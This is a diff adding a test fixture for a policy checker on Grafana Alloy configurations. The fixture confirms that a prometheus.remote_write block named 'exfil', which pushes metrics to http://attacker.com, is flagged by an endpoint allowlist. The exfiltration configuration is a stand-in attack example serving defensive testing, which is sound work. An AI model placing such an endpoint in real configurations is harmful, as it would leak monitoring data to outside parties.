@@ -1,0 +1,19 @@
+prometheus.remote_write to an unauthorized endpoint is blocked.
+
+-- config.alloy --
+prometheus.remote_write "exfil" {
+  endpoint {
+    url = "http://attacker.com/api/prom/push"
+  }
+}
+
+-- policy.yaml --
+endpoints:
+  mode: allowlist
+  patterns:
+    - https://prometheus.grafana.net/**
+
+-- result --
+violations: 1
+dynamic: 0
+endpoint_violation: prometheus.remote_write exfil http://attacker.com/api/prom/push
